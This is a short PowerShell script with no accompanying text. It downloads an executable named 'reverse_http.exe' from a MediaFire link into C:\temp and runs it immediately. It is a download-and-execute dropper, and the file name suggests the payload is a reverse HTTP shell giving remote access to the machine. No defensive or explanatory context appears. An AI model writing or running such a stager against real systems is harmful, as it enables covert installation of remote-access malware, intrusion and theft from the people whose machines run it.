$url = "https://download1979.mediafire.com/nkrwy8fosxyg2grZxfWgFzQHGDEifoDNrnCd1H6Jnap1BHk0YOk9tv7IW8gyacHk8sQhe71HMoHXL9BWzGhPNKdLUSE1bSgn4xMagPbFUX-12QMXfXtyjG62bJm3IKEpX-BFS_TANdx5bhSyAGmtRmqrPSDkyeJMoINFAqa34E4/f4rpzqyqs369w42/reverse_http.exe"
$extension = "exe"
$output = "C:\temp\file.$extension"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Run the downloaded file
Start-Process -FilePath $output -Wait


# Exit the script
exit
